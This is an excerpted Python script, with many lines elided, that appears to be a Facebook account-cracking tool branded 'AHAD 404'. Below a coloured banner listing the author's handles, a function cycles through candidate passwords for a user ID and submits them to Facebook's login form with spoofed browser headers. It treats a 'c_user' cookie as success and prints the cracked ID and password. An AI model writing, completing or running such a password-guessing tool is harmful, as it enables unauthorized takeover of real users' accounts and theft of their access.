...
logo = (""" 
  ...
  \033[1;93m   O)  O))    O))     O))    O)  O))    O))    O))        
  \033[1;94m  O))   O))   O)))))) O))   O))   O))   O))    O))    
 \033[1;92m O)))))) O)) O))     O))  O)))))) O))  O))    O))        
\033[1;93m O))       O)) O))     O)) O))       O)) O))   O))        
\033[1;91mO))         O))O))     O))O))         O))O)))))          
 ...
 ┃ [✓] GITHUB    \033[1;91m : \033[1;92m        AHAD 404    ┃
 ┃ [✓] FACEBOOK  \033[1;91m : \033[1;92m        ABDUL AHAD        ┃
 ┃ [✓] WHATSAPP  \033[1;91m : \033[1;92m      013********       ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'Hos': 'x.facebook.com',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[AHAD-CP] {cid}|{ps}")
